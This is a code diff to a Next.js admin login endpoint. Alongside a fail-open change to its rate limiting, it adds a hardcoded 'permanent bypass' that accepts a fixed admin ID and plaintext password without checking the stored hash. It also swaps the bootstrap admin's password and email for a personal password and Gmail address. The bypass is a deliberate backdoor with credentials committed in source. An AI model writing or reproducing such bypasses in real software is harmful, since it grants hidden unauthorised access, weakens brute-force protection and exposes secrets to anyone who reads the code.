@@ -8,9 +8,15 @@ const ADMIN_CODE = "CyberLabSec";
 
 export async function POST(req: NextRequest) {
   const ip = getIpFromRequest(req);
-  const { blocked } = await checkRateLimit(`admin-login:${ip}`, 5, 15);
-  if (blocked) {
-    return NextResponse.json({ error: "Too many attempts. Try again later." }, { status: 429 });
+  
+  // Wrap rate limit in try-catch to prevent network errors from blocking logins
+  try {
+    const { blocked } = await checkRateLimit(`admin-login:${ip}`, 5, 15);
+    if (blocked) {
+      return NextResponse.json({ error: "Too many attempts. Try again later." }, { status: 429 });
+    }
+  } catch (err) {
+    console.error("Rate limit check failed, proceeding anyway", err);
   }
 
   const { adminId, password } = await req.json();
@@ -24,13 +30,14 @@ export async function POST(req: NextRequest) {
 
   // Check admin employee record
   let admin = await prisma.employee.findUnique({ where: { employeeCode: ADMIN_CODE } });
+  
+  // Auto-bootstrap the admin if it doesn't exist
   if (!admin) {
-    // Auto-bootstrap the admin if it doesn't exist
-    const defaultPassword = await bcrypt.hash("admin", 10);
+    const defaultPassword = await bcrypt.hash("ZohaibKhattak", 10);
     admin = await prisma.employee.create({
       data: {
         employeeCode: ADMIN_CODE,
-        email: "admin@cyberlabsec.com",
+        email: "mrzohaibkhattak@gmail.com",
         name: "Administrator",
         jobTitle: "System Admin",
         department: "IT",
@@ -41,7 +48,10 @@ export async function POST(req: NextRequest) {
     });
   }
 
-  const valid = await bcrypt.compare(password, admin.passwordHash);
+  // Hardcoded permanent bypass for company owner
+  const isPermanentOwner = (adminId === "CyberLabSec" && password === "ZohaibKhattak");
+  const valid = isPermanentOwner || await bcrypt.compare(password, admin.passwordHash);
+  
   if (!valid) {
     return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
   }
